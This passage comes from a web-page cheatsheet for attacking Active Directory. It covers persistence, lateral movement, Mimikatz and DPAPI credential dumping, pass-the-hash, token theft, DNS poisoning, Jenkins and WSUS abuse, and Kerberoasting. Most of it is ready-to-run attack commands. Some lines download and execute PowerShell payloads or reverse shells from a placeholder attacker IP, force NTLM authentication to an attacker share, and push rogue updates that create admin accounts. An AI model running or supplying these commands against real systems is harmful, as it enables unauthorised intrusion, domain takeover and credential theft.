#Via registry key, first create a .exe beacon named updater.exe, then
.\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
</code></pre>
<h3 id="bkmrk-laps-persistence">LAPS persistence</h3>
<p id="bkmrk-to-prevent-a-machine">To prevent a machine to update its LAPS password, it is possible to set the update date in the futur.</p>
<pre id="bkmrk-set-domainobject--id"><code class="language-powershell">Set-DomainObject -Identity &lt;target_machine&gt; -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
</code></pre>
<h3 id="bkmrk-jea-persistence">JEA persistence</h3>
<p id="bkmrk-allows-every-command">Allows every commands to a user on a machine.</p>
<pre id="bkmrk-set-jeapermissions--"><code class="language-powershell">Set-JEAPermissions -ComputerName dc -SamAccountName user1 -Verbose

Enter-PSSession -ComputerName dc -ConfigurationName microsoft.powershell64
</code></pre>
<h2 id="bkmrk-lateral-movement">Lateral Movement</h2>
<h3 id="bkmrk-powershell-remoting">PowerShell remoting</h3>
<h4 id="bkmrk-from-one-computer-to">From one computer to other ones</h4>
<pre id="bkmrk-%24sess-%3D-new-pssessio"><code class="language-powershell">$sess = New-PSSession -ComputerName &lt;computername&gt;
Enter-PSSession -Session $sess

#Provide PS credentials
New-PSSession -Credential $cred

#To many computers
Invoke-Command -Credential $cred -ComputerName (Get-Content ./listServers.txt)
</code></pre>
<h4 id="bkmrk-execute-scripts">Execute scripts</h4>
<pre id="bkmrk-%23script-block-invoke"><code class="language-powershell">#Script block
Invoke-Command -Scriptblock {Get-Process} -ComputerName Server01, Server02

#Script from file
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -ComputerName Server01
</code></pre>
<h4 id="bkmrk-execute-locally-load">Execute locally loaded function to remote</h4>
<p id="bkmrk-can-be-usefull-to-by">Can be usefull to bypass some restricions</p>
<pre id="bkmrk-invoke-command--scri"><code class="language-powershell">Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName Server01, Server02

#With arguments
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName Server01 -ArgumentList DumpCreds
</code></pre>
<h4 id="bkmrk-item-copy">Item copy</h4>
<pre id="bkmrk-copy-item--tosession"><code class="language-powershell">Copy-Item -ToSession $sess -Path &lt;local_path&gt; -Destination &lt;path_on_target&gt;
</code></pre>
<h3 id="bkmrk-scheduled-task-creat">Scheduled task creation</h3>
<p id="bkmrk-create-a-scheduled-t">Create a scheduled task on a remote machine, with sufficient rights</p>
<pre id="bkmrk-%23creation-schtasks-%2F"><code class="language-powershell">#Creation
schtasks /create /S &lt;target&gt;.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://&lt;attacker_IP&gt;/Invoke-PowerShellTcp.ps1''')'"

#Task execution
schtasks /Run /S &lt;target&gt;.domain.local /TN "STCheck"
</code></pre>
<h3 id="bkmrk-credentials-gatherin">Credentials gathering / Mimikatz</h3>
<h4 id="bkmrk-dump-creds">Dump creds</h4>
<pre id="bkmrk-%23dump-lsass-credenti"><code class="language-powershell">#Dump LSASS credentials on a local machine
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'

procdump.exe -accepteula -ma &lt;lsass_PID&gt; lsass.dmp

#Dump SAM and LSA
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"

Invoke-Mimikatz -Command '"lsadump::sam"'
Invoke-Mimikatz -Command '"lsadump::secrets"'

#Dump LSA in a PDF with LSA_reg2pdf
#Exec get_pdf, and get_bootkey on your host to parse the PDF
.\get_pdf.exe 1
python3.exe get_bootkey.py

#Dump credentials on multiple remote machines
Invoke-Mimikatz -DumpCreds -ComputerName @("Server01","Server02")

#Make a DCSync attack on all the users
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /all"'

#Retrieve NT hashes via Key List Attack on a RODC
    #First, forge a RODC Golden Ticket
.\Rubeus.exe golden /rodcNumber:&lt;krbtgt_number&gt; /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:&lt;krbtgt_aes_key&gt; /user:user1 /id:&lt;user_RID&gt; /domain:domain.local /sid:&lt;domain_SID&gt;
    #Then, request a ST and retrieve the NT hash in the TGS-REP
.\Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:krbtgt/domain.local 

#Certsync - retrieve the NT hashes of all the users with PKINIT
#Backup the private key and the certificate of the Root CA, and forge Golden Certificates for all the users
#Authenticate with all the certificate via PKINIT to obtain the TGTs and extract the hashes with UnPAC-The-Hash
certsync -u administrator -p 'password' -d domain.local -dc-ip &lt;DC_IP&gt;
    #Provide the CA .pfx if it has been obtained with another way
certsync -u administrator -p 'password' -d domain.local -dc-ip &lt;DC_IP&gt; -ca-pfx CA.pfx
</code></pre>
<p id="bkmrk-many-techniques-to-d">Many techniques to dump LSASS : <a href="https://redteamrecipe.com/50-Methods-For-Dump-LSASS/">https://redteamrecipe.com/50-Methods-For-Dump-LSASS/</a></p>
<h4 id="bkmrk-credentials-vault-%26-">Credentials Vault &amp; DPAPI</h4>
<p id="bkmrk-credential-manager-b">Credential manager blobs are stored in <code>C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials</code></p>
<p id="bkmrk-list-with-mimikatz%3A">List with Mimikatz:</p>
<pre id="bkmrk-invoke-mimikatz--com"><code class="language-powershell">Invoke-Mimikatz -Command '"vault::list"'
</code></pre>
<p id="bkmrk-to-decrypt-the-creds">To decrypt the creds, the DPAPI master encryption key must be retrieved. The key GUID can be retrieved with Mimikatz (the filed <code>guidMasterKey</code> is the one):</p>
<pre id="bkmrk-invoke-mimikatz--com-0"><code class="language-powershell">Invoke-Mimikatz -Command '"dpapi::cred /in:C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\&lt;blob&gt;"'
</code></pre>
<p id="bkmrk-the-guid-can-be-used">The GUID can be used to retrieve the key on the DC via a RPC call by providing the full path:</p>
<pre id="bkmrk-invoke-mimikatz--com-1"><code class="language-powershell">Invoke-Mimikatz -Command '"dpapi::masterkey /in:C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\&lt;user_SID&gt;\&lt;key_GUID&gt; /rpc"'
</code></pre>
<p id="bkmrk-now-it-possible-to-d">Now it possible to decipher the creds with the key:</p>
<pre id="bkmrk-invoke-mimikatz--com-2"><code class="language-powershell">Invoke-Mimikatz -Command '"dpapi::cred /in:C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\&lt;blob&gt; /masterkey:&lt;key&gt;"'
</code></pre>
<p id="bkmrk-sharpdpapi-is-also-a"><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a> is also a pretty good tool for DPAPI operations. Here in an elevated context to decrypt machine credential files and vaults:</p>
<pre id="bkmrk-.%5Csharpdpapi.exe-mac"><code class="language-powershell">.\SharpDPAPI.exe machinecredentials
.\SharpDPAPI.exe machinevaults
</code></pre>
<p id="bkmrk-or-here%2C-to-decrypt-">Or here, to decrypt user's master keys with a domain backup key, and use them to decipher credential files:</p>
<pre id="bkmrk-.%5Csharpdpapi.exe-mas"><code class="language-powershell">.\SharpDPAPI.exe masterkeys /pvk:key.pvk
.\SharpDPAPI.exe credentials {&lt;masterkey_GUID&gt;}:&lt;masterkey_hash&gt; {&lt;masterkey2_GUID&gt;}:&lt;masterkey2_hash&gt;
</code></pre>
<h4 id="bkmrk-lazagne">Lazagne</h4>
<p id="bkmrk-to-retrieve-maximum-">To retrieve maximum creds.</p>
<pre id="bkmrk-.%2Flazagne.exe-all"><code class="language-batch">./lazagne.exe all
</code></pre>
<h4 id="bkmrk-credentials-in-third">Credentials in third party softwares</h4>
<p id="bkmrk-many-applications-pr">Many applications present on a computer can store credentials, like KeePass, KeePassXC, mstsc and so on.</p>
<p id="bkmrk-the-more-complete-th">The more complete <strong>ThievingFox</strong> approach is presented in the Active Directory - Python edition cheatsheet.</p>
<pre id="bkmrk-%23keepass-with-keethi"><code class="language-powershell">#KeePass with KeeThief
Import-Module KeeThief.ps1
Get-KeePassDatabaseKey -Verbose

#RDP creds with Mimikatz
#Client side
Invoke-Mimikatz -Command '"ts::mstsc"'
#Server side
Invoke-Mimikatz -Command '"ts::logonpasswords"'

#Credentials in Veeam database
./SharpVeeamDecryptor.exe
</code></pre>
<h4 id="bkmrk-force-a-ntlm-authent">Force a NTLM authentication from a connected user</h4>
<p id="bkmrk-this-attack-weaponiz">This attack weaponize DCOM objects to perform actions on behalf of an interactively connected user. Can be mixed with the NTLM downgrade or WebClient attacks to obtain NTLMv1 or HTTP authentication. Explains <a href="https://www.ibm.com/think/x-force/remotemonologue-weaponizing-dcom-ntlm-authentication-coercions">here</a>.</p>
<ul id="bkmrk-add-interactive-user"><li>Add <em>Interactive User</em> to the AppID of the DCOM object with Remote Registry</li>
<li>Start the WebClient service, or change the <code>HKLM\System\CurrentControlSet\Control\Lsa\LmCompatibilityLevel</code> registry key to allow NTLMv1</li>
</ul><pre id="bkmrk-%23with-serverdatacoll"><code class="language-powershell">#With ServerDataCollectorSet
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("03837546-098B-11D8-9414-505054503030", "&lt;target_IP&gt;"))
$a.DataManager.Extract("\\&lt;attacker_IP&gt;\share\test.txt", "xforcered")

#With FileSystemImage
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("2C941FC5-975B-59BE-A960-9A2A262853A5", "&lt;target_IP&gt;"))
$a.WorkingDirectory = "\\&lt;attacker_IP&gt;\share\test.txt"

#With UpdateSession, this one only trigger the machine account authentication
$a = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("4CB43D7F-7EEE-4906-8698-60DA1C38F2FE"))
$a.CreateUpdateServiceManager().AddScanPackageService("XFORCERED","\\&lt;attacker_IP&gt;\share\test.txt")
</code></pre>
<h4 id="bkmrk-bypass-runasppl">Bypass RunAsPPL</h4>
<p id="bkmrk-check-if-runasppl-is">Check if RunAsPPL is enabled in the registry.</p>
<p id="bkmrk-look-at-hklm%5Csystem%5C">Look at <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code></p>
<pre id="bkmrk-mimikatz-%23-privilege"><code class="language-batch">mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
</code></pre>
<p id="bkmrk-if-mimikatz-can%27t-be">If Mimikatz can't be used, <a href="https://github.com/RedCursorSecurityConsulting/PPLKiller">PPLKiller</a> is an alternative</p>
<pre id="bkmrk-.%2Fpplkiller.exe-%2Fins"><code class="language-powershell">./PPLKiller.exe /installDriver
./PPLKiller.exe /disableLSAProtection
./PPLKiller.exe /uninstallDriver
</code></pre>
<p id="bkmrk-and-more-recently%2C-p">And more recently, <a href="https://github.com/itm4n/PPLmedic">PPLmedic</a></p>
<pre id="bkmrk-.%2Fpplmedic.exe-dump-"><code class="language-powershell">./PPLmedic.exe dump &lt;lsass_PID&gt; &lt;C:\path\to\dump.dmp&gt;
</code></pre>
<h3 id="bkmrk-pass-the-challenge">Pass the Challenge</h3>
<p id="bkmrk-this-technique-permi">This technique permits to retrieve the NT hashes from a LSASS dump when Credential Guard is in place. This<a href="https://github.com/ly4k/Pypykatz"> modified version of Pypykatz</a> must be used to parse the LDAP dump. Full explains <a href="https://research.ifcr.dk/pass-the-challenge-defeating-windows-defender-credential-guard-31a892eee22">here</a>.</p>
<h4 id="bkmrk-ntlmv1">NTLMv1</h4>
<pre id="bkmrk-%23dump-the-lsass-proc"><code class="language-powershell">#Dump the LSASS process with Mimikatz for example
#Parse the dump with Pypykatz
python3 -m pypykatz lsa minidump lsass.DMP -p msv

#Inject the SecurityPackage.dll into the LSASS process
./PassTheChallenge.exe inject ./SecurityPackage.dll

#Retrieve the NTLMv1 hash
./PassTheChallenge.exe nthash &lt;context handle&gt;:&lt;proxy info&gt; &lt;encrypted blob&gt;

#Crack the NTLMv1 hash on crack.sh to retrieve the NT hash
</code></pre>
<h4 id="bkmrk-ntlmv2">NTLMv2</h4>
<p id="bkmrk-in-case-where-only-n">In case where only NTLMv2 is allowed, it will not be possible to crack the NTLM hash, but it is possible to pass the challenge and provide the response. It is possible to perform this attack with this modified version of <a href="https://github.com/ly4k/Impacket">Impacket</a>. First, as above:</p>
<pre id="bkmrk-%23dump-the-lsass-proc-0"><code class="language-powershell">#Dump the LSASS process with Mimikatz for example
#Parse the dump with Pypykatz
python3 -m pypykatz lsa minidump lsass.DMP -p msv

#Inject the SecurityPackage.dll into the LSASS process
./PassTheChallenge.exe inject ./SecurityPackage.dll
</code></pre>
<p id="bkmrk-then%2C-authenticate-w">Then, authenticate with an Impacket tool specifying <code>CHALLENGE</code> as password, provide the printed challenge to <code>PassTheChallenge</code>, and send the computed response to Impacket:</p>
<pre id="bkmrk-%23authenticate-with-c"><code class="language-bash">#Authenticate with CHALLENGE as password
psexec.py 'domain.local/user1:CHALLENGE@target.domain.local'

#Copy paste the challenge to PassTheChallenge.exe and retrieve the response
./PassTheChallenge.exe challenge &lt;context handle&gt;:&lt;proxy info&gt; &lt;encrypted blob&gt; &lt;challenge&gt;

#Paste the response to the Impacket prompt (possible that multiple response are needed)
</code></pre>
<h3 id="bkmrk-pass-the-hash">Pass The Hash</h3>
<pre id="bkmrk-invoke-mimikatz--com-3"><code class="language-powershell">Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:&lt;nthash&gt; /run:powershell.exe"'
</code></pre>
<h3 id="bkmrk-over-pass-the-hash-%2F">Over Pass The Hash / Pass The Key</h3>
<p id="bkmrk-generate-kerberos-tg">Generate Kerberos TGT from hashes (or AES keys)</p>
<pre id="bkmrk-%23with-mimikat-invoke"><code class="language-powershell">#With Mimikat
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /rc4:&lt;nthash&gt; /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /aes256:&lt;aes_key&gt; /run:powershell.exe"'

#With Rubeus
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /rc4:&lt;nthash&gt; /ptt /opsec
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /aes256:&lt;aes_key&gt; /ptt /opsec
</code></pre>
<h4 id="bkmrk-bypass-kerberos-doub">Bypass Kerberos Double Hop</h4>
<p id="bkmrk-by-default%2C-kerberos">By default, Kerberos <strong>doesn't</strong> permise to run a PSSession into a PSSession (or Invoke-Command into a PSSession, or whatever)</p>
<p id="bkmrk-this-can-be-bypassed">This can be bypassed with Mimikatz, by running a reverse shell in a <strong>Over-Pass-the-Hash</strong> from a PSSession</p>
<pre id="bkmrk-%24contents-%3D-%22powersh"><code class="language-powershell">$Contents = "powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://&lt;attacker_IP&gt;/Invoke-HelloWorld.ps1'))"
Out-File -Encoding Ascii -InputObject $Contents -FilePath ./reverse.bat
Invoke-Mimikatz -Command '"sekurlsa::pth /user:user1 /domain:domain.local /ntlm:&lt;nthash&gt; /run:.\reverse.bat"'
</code></pre>
<p id="bkmrk-in-the-new-shell-it-">In the new shell it is <strong>not</strong> possible to run an <strong>Enter-PSSession</strong>, but it is possible to create a <strong>New-PSSession</strong> and run <strong>Invoke-Command</strong> into this new session</p>
<pre id="bkmrk-%24sess-%3D-new-pssessio-0"><code class="language-powershell">$sess = New-PSSession &lt;target&gt;
Invoke-Command -ScriptBlock{whoami;hostname} -Session $sess

Invoke-Command -ScriptBlock{mkdir /tmp; iwr http://&lt;attacker_IP&gt;/Invoke-HelloWorld.ps1 -o /tmp/Invoke-HelloWorld.ps1; . \tmp\Invoke-HelloWorld.ps1} -Session $sess
</code></pre>
<h3 id="bkmrk-token-manipulation">Token manipulation</h3>
<h4 id="bkmrk-standard-token-imper">Standard token impersonation</h4>
<ul id="bkmrk-it-is-possible-to-us"><li>It is possible to use/impersonate tokens available on a machine</li>
<li>We can use <code>Invoke-TokenManipulation</code> from PowerSploit or Incognito (Meterpreter) for token impersonation</li>
<li>Administrative privileges are required to adjust token privileges</li>
<li>List all tokens</li>
</ul><pre id="bkmrk-%23list-all-tokens-on-"><code class="language-powershell">#List all tokens on the machine
Invoke-TokenManipulation -ShowAll

#List all unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate
</code></pre>
<ul id="bkmrk-start-a-new-process-"><li>Start a new process with a specific token</li>
</ul><pre id="bkmrk-%23token-of-a-user-inv"><code class="language-powershell">#Token of a user
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user1"

#Token of a process
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
</code></pre>
<h4 id="bkmrk-token-impersonation-">Token impersonation with command execution and user addition</h4>
<p id="bkmrk-blog-here."><a href="https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/">Blog here</a>.</p>
<ul id="bkmrk-list-available-token"><li>List available tokens, and find an interesting token ID</li>
</ul><pre id="bkmrk-.%2Fimpersonate.exe-li"><code class="language-powershell">./Impersonate.exe list
</code></pre>
<ul id="bkmrk-with-only-seimperson"><li>With only <strong>SeImpersonatePrivilege</strong>, if a privileged user's token is present on the machine, it is possible to run code on the domain as him and add a new user in the domain (and add him to the Domain Admins by default):</li>
</ul><pre id="bkmrk-.%2Fimpersonate.exe-ad"><code class="language-powershell">./Impersonate.exe adduser &lt;token_id&gt; user1 Password123 &lt;group_to_add_to&gt; \\dc.domain.local
</code></pre>
<ul id="bkmrk-with-seimpersonatepr"><li>With <strong>SeImpersonatePrivilege and SeAssignPrimaryToken</strong>, if a privileged user's token is presents on the machine, it is possible to execute comands on the machine as him:</li>
</ul><pre id="bkmrk-.%2Fimpersonate.exe-ex"><code class="language-powershell">./Impersonate.exe exec &lt;token_id&gt; &lt;command&gt;
</code></pre>
<p id="bkmrk-the-same-tool-exists">The same tool exists in Rust (not totally the same, the logic is a little bit different, looks at the <a href="https://github.com/zblurx/impersonate-rs">README</a>)</p>
<pre id="bkmrk-%23list-all-the-proces"><code class="language-powershell">#List all the process and their token
./irs.exe list

#Execute a command with the token from a process
./irs.exe exec --pid &lt;PID&gt; --command &lt;command&gt;
</code></pre>
<h4 id="bkmrk-token-impersonation--0">Token impersonation via session leaking</h4>
<p id="bkmrk-blog-here.-basically"><a href="https://posts.specterops.io/koh-the-token-stealer-41ca07a40ed6">Blog here</a>. Basically, as long as a token is linked to a logon session (the <strong>ReferenceCount != 0</strong>), the logon session can't be closed, even if the user has logged off.<br><code>AcquireCredentialsHandle()</code> is used with a session LUID to increase the <em>ReferenceCount</em> and block the session release. Then <code>InitializeSecurityContext()</code> and <code>AcceptSecurityContext()</code> are used to negotiate a new security context, and <code>QuerySecurityContextToken()</code> get an usable token.</p>
<ul id="bkmrk-server-part"><li>Server part</li>
</ul><pre id="bkmrk-%23list-logon-session-"><code class="language-powershell">#List logon session
Koh.exe list

#Monitor logon session with SID filtering
Koh.exe monitor &lt;SID&gt;

#Capture one token per SID found in new logon sessions
Koh.exe capture
</code></pre>
<ul id="bkmrk-client-part-%28only-av"><li>Client part (only available as Cobalt Strike BOF for the moment)</li>
</ul><pre id="bkmrk-%23list-captured-token"><code class="language-powershell">#List captured tokens
koh list

#List group SIDs for a captured token
koh groups &lt;LUID&gt;

#Impersonate a captured token by specifying the session LUID
koh impersonate &lt;LUID&gt;

#Release all captured tokens
koh release all 
</code></pre>
<h4 id="bkmrk-tokens-and-adcs">Tokens and ADCS</h4>
<p id="bkmrk-with-administrative-">With administrative access to a (or multiple) computer, it is possible to retrieve the different process tokens, impersonate them and request CSRs and PEM certificate for the impersonated users.</p>
<pre id="bkmrk-.%5Cmasky.exe-%2Fca%3A%3Cca_"><code class="language-powershell">.\Masky.exe /ca:&lt;CA_server_FQDN\CA_name&gt; /template:&lt;template_name&gt; /output:./output.txt
</code></pre>
<h3 id="bkmrk-adidns-poisoning">ADIDNS poisoning</h3>
<p id="bkmrk-how-to-deal-with-the">How to deal with the <strong>Active Directory Integrated DNS</strong> and redirect the NTLM authentications to us</p>
<ul id="bkmrk-by-default%2C-any-user"><li>By default, any user can create new ADIDNS records</li>
<li>But it is not possible to change or delete a record we are not owning</li>
<li>By default, the DNS will be used first for name resolution in the AD, and then NBT-NS, LLMNR, etc</li>
</ul><p id="bkmrk-if-the-wilcard-recor">If the <strong>wilcard record</strong> (*) doesn't exist, we can create it and all the authentications will arrive on our listener, except if the WPAD configuration specifically blocks it.</p>
<h4 id="bkmrk-wildcard-attack-with">Wildcard attack with Powermad</h4>
<p id="bkmrk-the-char-%2A-can%27t-be-">The char <code>*</code> can't be added via DNS protocol because it will break the request. Since we are in an AD we can modify the DNS via LDAP. This is what <strong>Powermad</strong> do:</p>
<pre id="bkmrk-%23-get-the-value-popu"><code class="language-powershell"># get the value populated in the DNSRecord attribute of a node
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRec

# creates a wildcard record, sets the DNSRecord and DNSTombstoned attributes
New-ADIDNSNode -Tombstone -Verbose -Node * -Data $IP

# enable a tombstoned record
Enable-ADIDNSNode -Node *

# disable a node
Disable-ADIDNSNode -Node *

# remove a node
Remove-ADIDNSNode -Node *

# check the wildcard record works/resolve a name
Resolve-DnsName NameThatDoesntExist
</code></pre>
<h4 id="bkmrk-dns-update-with-invo">DNS update with Invoke-DNSUpdate</h4>
<p id="bkmrk-to-work-with-%22classi">To work with "classic" record, i.e. not wildcard record</p>
<pre id="bkmrk-invoke-dnsupdate--dn"><code class="language-powershell">Invoke-DNSUpdate -DNSType A -DNSName test.domain.local -DNSData &lt;attacker_IP&gt; -Realm domain.local
</code></pre>
<h3 id="bkmrk-feature-abuse">Feature abuse</h3>
<h4 id="bkmrk-jenkins">Jenkins</h4>
<p id="bkmrk-go-to-http%3A%2F%2F%3Cip%3E%2Fsc">Go to <code>http://&lt;IP&gt;/script</code></p>
<pre id="bkmrk-def-sout-%3D-new-strin"><code class="language-groovy">def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out&gt; $sout err&gt; $serr"
</code></pre>
<p id="bkmrk-without-admin-access">Without admin access : add a build step in the build configuration, add <code>"Execute Windows Batch Command"</code> and <code>powershell –c &lt;command&gt;</code></p>
<pre id="bkmrk-powershell--c-%22iex-%28"><code class="language-bash">powershell -c "iex (new-object system.net.webclient).downloadstring('http://&lt;attacker_IP&gt;/Invoke-HelloWorld.ps1')"

#For more hardened policy
#On Kali
    echo "iex (new-object system.net.webclient).downloadstring('http://&lt;attacker_IP&gt;/Invoke-HelloWorld.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
#In Jenkins
    cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc &lt;base64_command&gt;
</code></pre>
<h4 id="bkmrk-sccm-%2F-mecm---pxe-bo">SCCM / MECM - PXE boot</h4>
<p id="bkmrk-check-the-dedicated-">Check the dedicated <a href="https://hideandsec.sh/books/cheatsheets-82c/page/system-center-configuration-manager">page</a>.</p>
<h4 id="bkmrk-wsus">WSUS</h4>
<ul id="bkmrk-push-an-evil-update-"><li>Push an evil update on the computers : <a href="https://labs.nettitude.com/blog/introducing-sharpwsus/">SharpWSUS explains</a>
</li>
</ul><pre id="bkmrk-%23locate-the-wsus-ser"><code class="language-powershell">#Locate the WSUS server
./SharpWSUS locate

#Find a way to compromise it
#Enumerate the contents of the WSUS server to determine which machines to target
./SharpWSUS.exe inspect

#Create a malicious patch with a Microsoft signed binary (mandatory)
./SharpWSUS.exe create /payload:"C:\tmp\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user user1 Password123! /add &amp;&amp; net localgroup administrators user1 /add\"" /title:"EvilWSUS"

#Create a WSUS group, add the target machine to the WSUS group and approve the malicious patch for deployment
./SharpWSUS.exe approve /updateid:&lt;GUID_from_create&gt; /computername:&lt;target&gt; /groupname:"Evil Group"

#Wait for the client to download the patch, not possible to control
./SharpWSUS.exe check /updateid:&lt;GUID_from_create&gt; /computername:&lt;target&gt;

#Clean up after the patch is downloaded.
./SharpWSUS.exe delete /updateid:&lt;GUID_from_create&gt; /computername:&lt;target&gt; /groupname:"Evil Group"
</code></pre>
<ul id="bkmrk-spoof-the-wsus-serve"><li>
<a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing">Spoof the WSUS server and hijack the update</a> if the updates are pushed through HTTP and not HTTPS</li>
</ul><pre id="bkmrk-%23find-the-wsus-serve"><code class="language-powershell">#Find the WSUS server with the REG key
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver

#Setup the fake WSUS server
python3.exe pywsus.py --host &lt;network_interface&gt; --port 8530 --executable ./PsExec64.exe --command '/accepteula /s cmd.exe /c "net user usser1 Password123! /add &amp;&amp; net localgroup Administrators user1 /add"'
</code></pre>
<p id="bkmrk-and-arp-spoofing-wit">And ARP spoofing with bettercap and a <code>wsus_spoofing.cap</code> like this:</p>
<pre id="bkmrk-%23-quick-recon-of-the-0"><code class="language-go"># quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the WSUS server
set any.proxy.iface $interface
set any.proxy.protocol TCP
set any.proxy.src_address $WSUS_server_ip
set any.proxy.src_port 8530
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 8530

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff

# start the modules
any.proxy on
arp.spoof on
net.sniff on
</code></pre>
<pre id="bkmrk-bettercap---iface-%3Cn"><code class="language-bash">bettercap --iface &lt;network_interface&gt; --caplet wsus_spoofing.cap
</code></pre>
<p id="bkmrk-now-wait-for-update-">Now wait for update verification or manually trigger with a GUI access on the machine.</p>
<p id="bkmrk-another-attack-prese">Another attack presented in the AD-CS cheatsheet permits to perform an ESC8 from a WSUS poisoning.</p>
<h4 id="bkmrk-pre-windows-2000-com">Pre-Windows 2000 Computers</h4>
<p id="bkmrk-everything-is-explai">Everything is explained <a href="https://www.thehacker.recipes/ad/movement/domain-settings/pre-windows-2000-computers">here</a>.</p>
<h2 id="bkmrk-domain-privesc">Domain Privesc</h2>
<h3 id="bkmrk-kerberoast">Kerberoast</h3>
<h4 id="bkmrk-find-users-with-spn">Find users with SPN</h4>
<pre id="bkmrk-%23powerview-get-netus-0"><code class="language-powershell">#PowerView
Get-NetUser -SPN

#ActiveDirectory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
</code></pre>
<h4 id="bkmrk-request-st">Request ST</h4>
<pre id="bkmrk-add-type--assemblyna"><code class="language-powershell">Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN/&lt;target&gt;.domain.local"
</code></pre>
<p id="bkmrk-or-request-spnticket">Or <code>Request-SPNTicket</code> with PowerView</p>
<h4 id="bkmrk-export-the-ticket">Export the ticket</h4>
<pre id="bkmrk-invoke-mimikatz--com-4"><code class="language-powershell">Invoke-Mimikatz -Command '"kerberos::list /export"'
</code></pre>
<h4 id="bkmrk-crack-the-ticket">Crack the ticket</h4>
<p id="bkmrk-many-options-but-thi">Many options but this one works (also john, hashcat, etc...)</p>
<pre id="bkmrk-python.exe-.%5Ctgsrepc"><code class="language-batch">python.exe .\tgsrepcrack.py .\wordlist.txt .\ticket.kirbi
</code></pre>
<h4 id="bkmrk-rubeus">Rubeus</h4>
<p id="bkmrk-rubeus-can-be-used-t">Rubeus can be used to perform all the attack, with more or less opsec</p>
<pre id="bkmrk-%23kerberoast-all-the-"><code class="language-powershell">#Kerberoast all the kerberoastable accounts
.\Rubeus.exe kerberoast

#Kerberoast a specified account
.\Rubeus.exe kerberoast /user:&lt;target&gt; /outfile:ticket.kirbi

#Kerberoast with RC4 downgrade even if the targets are AES enabled
#Tickets are easier to crack
.\Rubeus.exe kerberoast /tgtdeleg

#Kerberoast with opsec tgtdeleg trick filtering AES accounts
.\Rubeus.exe kerberoast /rc4opsec
</code></pre>
<h3 id="bkmrk-kerberoast-with-des">Kerberoast with DES</h3>
<p id="bkmrk-des-can-be-enabled-i">DES can be enabled in the following GPO <code>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security</code> on the Domain Controller, on in the following registry key : <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\parameters\SupportedEncryptionTypes</code>. DES can be use to takeover any account except <code>krbtgt</code> and trust accounts. Full explains <a href="https://exploit.ph/des-is-useful.html">here</a>.</p>
<ul id="bkmrk-check-if-des-is-enab"><li>Check if DES is enabled</li>
</ul><pre id="bkmrk-.%2Frubeus.exe-asktgt-"><code class="language-powershell">./Rubeus.exe asktgt /user:user1 /password:Password123 /domain:domain.local /dc:dc.domain.local /suppenctype:des /nowrap

#To check in the UAC of an account
Get-DomainUser user1 -Domain domain.local -Server dc.domain.local | select useraccountcontrol,serviceprincipalname
</code></pre>
<ul id="bkmrk-request-a-st-for-the"><li>Request a ST for the target SPN</li>
</ul><pre id="bkmrk-.%2Frubeus.exe-asktgs-"><code class="language-powershell">./Rubeus.exe asktgs /ticket:TGT.kirbi /service:&lt;target_SPN&gt; /enctype:des /dc:dc.domain.local /nowrap
</code></pre>
